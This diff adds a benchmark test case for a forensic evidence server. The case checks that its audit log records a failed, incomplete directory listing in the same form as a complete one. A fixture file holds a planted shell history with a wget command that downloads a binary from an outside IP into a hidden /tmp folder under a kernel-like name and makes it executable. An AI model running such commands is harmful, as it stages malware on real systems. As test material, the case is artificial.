@@ -1,0 +1,61 @@
+# Matrix case P3081-019: _run_tool does not raise when the external command
+# fails; it appends "[STDERR]: ..." to the output. list_evidence then records
+# the number of output lines as "N lines", so a listing where ls -lahR could
+# not open a subfolder (exit code 1) is recorded in the same shape as a
+# complete listing.
+# A folder fixture's mode is set after its files are written, so the folder
+# holds a file the server cannot list. The bench container runs the server as
+# a non-root user.
+# The server is started with FINDEVIL_LOGS_DIR=${DB_DIR}, so the call record
+# is ${DB_DIR}/audit.json.
+case_id: P3081-019
+problem: P3081
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: multi-call
+level: mcp
+realism: possible
+realism_ko: "`/root`나 `/var/lib/` 아래처럼 소유자만 열 수 있는 폴더는 흔해, 권한을 지켜 마운트한 증거를 root가 아닌 계정으로 돌리는 서버는 그 폴더를 열지 못할 수 있다."
+coverage: full
+summary: 'list_evidence on a case with one folder the server cannot open returns the listing with "cannot open directory" (ls exit code 1), but get_audit_trail records it only as "N lines", in the same form as a complete listing, with nothing saying a folder was left out.'
+summary_ko: "열 수 없는 폴더가 하나 있는 사건에 `list_evidence`를 부르면 목록과 함께 `cannot open directory`(ls 종료 코드 1)가 나온다. 그런데 `get_audit_trail`은 이 호출을 완전한 목록과 같은 꼴인 `N lines`로만 기록하고, 폴더 하나가 빠졌다는 표시를 남기지 않는다."
+defect_ko: "이 서버는 `ls`가 실패해도 출력 줄 수만 `list_evidence`의 결과로 기록한다. 기록에는 명령이 실패했다는 사실과 빠진 폴더가 남아야 한다. 모델은 기록을 보고 증거 목록을 빠짐없이 받았다고 잘못 안다."
+setup_ko: "사건 폴더에 `etc/hostname`과, 읽기 권한을 없앤 `root/` 폴더(안에 `.bash_history`)를 두었다."
+fixture:
+  - path: case01/etc/hostname
+    text: "web01\n"
+  - path: case01/root/.bash_history
+    text: "wget http://203.0.113.50/x -O /tmp/.x/kworkerd\nchmod +x /tmp/.x/kworkerd\n"
+  - path: case01/root
+    dir: true
+    mode: "0000"
+steps:
+  - tool: list_evidence
+    note_ko: "열 수 있는 폴더만 든 목록"
+    args:
+      subdir: case01/etc
+  - tool: list_evidence
+    note_ko: "결함 호출: 열 수 없는 폴더가 있는 사건 목록"
+    args:
+      subdir: case01
+  - tool: get_audit_trail
+    note_ko: "호출 기록을 다시 읽는다"
+    args:
+      filter_tool: list_evidence
+expect:
+  - step: 1
+    note_ko: "열 수 있는 폴더 목록에는 실패 문구가 없다"
+    not_contains: "[STDERR]"
+  - step: 2
+    note_ko: "응답에는 `ls`가 폴더를 열지 못했다는 문구가 있다"
+    regex: "\\[STDERR\\]: ls: cannot open directory '[^']*/case01/root'"
+  - step: 3
+    note_ko: "완전한 목록과 실패한 목록이 같은 꼴(줄 수)으로 기록된다"
+    regex: '(?s)params: \{"subdir": "case01/etc"\}\n  result: \d+ lines\n.*params: \{"subdir": "case01"\}\n  result: \d+ lines'
+  - file_not_contains: ${DB_DIR}/audit.json
+    note_ko: "기록 파일에 실패 표시가 없다"
+    text: "cannot open directory"
+  - file_not_contains: ${DB_DIR}/audit.json
+    note_ko: "기록 파일에 빠진 폴더가 적혀 있지 않다"
+    text: "case01/root"
